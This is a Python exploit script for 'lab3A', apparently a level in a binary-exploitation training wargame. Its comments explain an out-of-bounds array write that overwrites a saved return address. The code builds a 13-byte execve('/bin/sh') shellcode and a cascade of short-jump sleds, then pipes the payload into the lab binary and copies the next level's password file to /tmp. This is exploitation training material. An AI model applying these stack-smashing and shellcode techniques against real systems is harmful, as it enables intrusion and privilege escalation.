#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab3A
'''

import os
import pwn
import struct


#   Behaviour: This program does a loop asking for commands until we type in
# the command "quit". It can store numbers in an array and read numbers
# previously stored.

#   Observations: The program only checks the first 5 (for store) or 4 (quit
# and read) bytes of the command buffer. The indexes that are multiples of 3
# or which address starts with 0xb7 are reserved and therefore unaccesible
# for us to store anything. The command buffer isn't cleared after the quit
# command.

#   Exploitation: Since there is only a partial control over the index (there
# is no top limit) we can overwrite stack values (with some limitations). We
# can potentially overwrite the eip and gain control of the program flow.

# First of all, we have to be sure if we can overwrite eip. In order to be
# able to do, the return address has to be at a valid index for us to store
# something in. The return address is at [esp+0x1cc] and the array starts at
# [esp+0x18]: this means that the ret address is at index (0x1cc-0x18)/4 = 109
# which isn't multiple of 3 nor its address starts with 0xb7 (since it is way
# up in the stack).

# Now that we know how to gain control of the eip register, we need something
# to do with it. We have a 15 byte buffer we can write to when typing a com-
# mand (19 bytes -"quit"), which means that if we can write a 15 byte shell-
# code, we can fit all of it inside that buffer.

# Luckily for us, there is a pointer to "/bin/sh" (0xb7f83a24), so our shell-
# code will be:

instructions = [
    'xor ecx, ecx',
    'mul ecx',
    'mov ebx, 0xb7f83a24',
    'mov al, SYS_execve',
    'int 0x80'
    ]

shell = ''.join(map(pwn.asm, instructions))

# Which is just 13 bytes!

# If we want to go simple we can just inject our shellcode and overwrite the
# return address, which may require some work to figure out the address
# shifting since there is no space for a nice NOP sled (or use fixenv).

# I think this level was designed to deal somehow with that gaps in the array
# caused by the reserved indexes. So I've decided to practice my jumping
# skills by using that huge buffer as the "landing platform" of the return
# address and then redirect eip with jmp instructions to the shellcode.

# My idea is to fill the buffer with short jumps so no matter where I land
# in that buffer because I will end in the shellcode (kind the same idea as for
# the NOP sled).

# Since short relative jumps allow a maximum forward jump of 0x7f bytes, I am
# going to implement a "cascade" of sleds in which each one will jump to the
# next one. This will give more room for address shifting.


def build_JMP_sled():
    '''
    This function will return a crafted string that will build the
    JMP sled in memory (short relative jumps)

    The JMP sled will look like this:
        ============================ ___
                                      |
                 JMP sled             |
     ----                             |
     |  ============================  |
     |  ============================  |
     --->                             |
                 JMP sled             |
     ----                             |
     |  ============================  | return address
     |  ============================  | somewhere here
     --->                             |
                 JMP sled             |
     ----                             |
     |  ============================ ___
     |  ============================
     --->        shellcode
        ============================

    Each sled will be allowed to jump at most 124 bytes (31 blocks of 4 bytes).
    The shellcode will be at index 101 so the indexes of the first jump of each
    sled will then be: 70 (101-31), 39 (101-62) and 9 (101-93 + 1 since the
    previous sled starts at an invalid index)
    '''

    sled = ''
    for j in [9, 39, 70]:
        i = j
        x = 0x7a           # Max distance to next sled or shellcode
        while x > 0:
            if i % 3 != 0:  # Write only when the index is valid
                n = struct.unpack('I', '\xeb%s\xeb%s' % (chr(x), chr(x-2)))[0]
                sled += 'store\\n%d\\n%d\\n' % (n, i)
            i += 1
            x -= 4

    return sled


# First, overwrite the return address with some one which is inside any of our
# JMP sleds (use gdb to view the stack). Note that if the exploit throws a
# SIGFAULT it coud be because we are landing at a reserved index, add 4 bytes
# to the address and try again
buf = 'store\\n%d\\n109\\n' % 0xbffff464
# Then, build the JMP sled
buf += build_JMP_sled()
# Finally, quit command with the shellcode
buf += 'quit' + shell
print buf

# Now we are ready to exploit the level
cmd = 'python -c \'print "%s"\'' % buf
os.system('(%s; echo "cat /home/lab3end/.pass > /tmp/lab3end.pass") ' % cmd +
          '| /levels/lab03/lab3A')
print '[+] Password saved in /tmp/lab3end.pass'
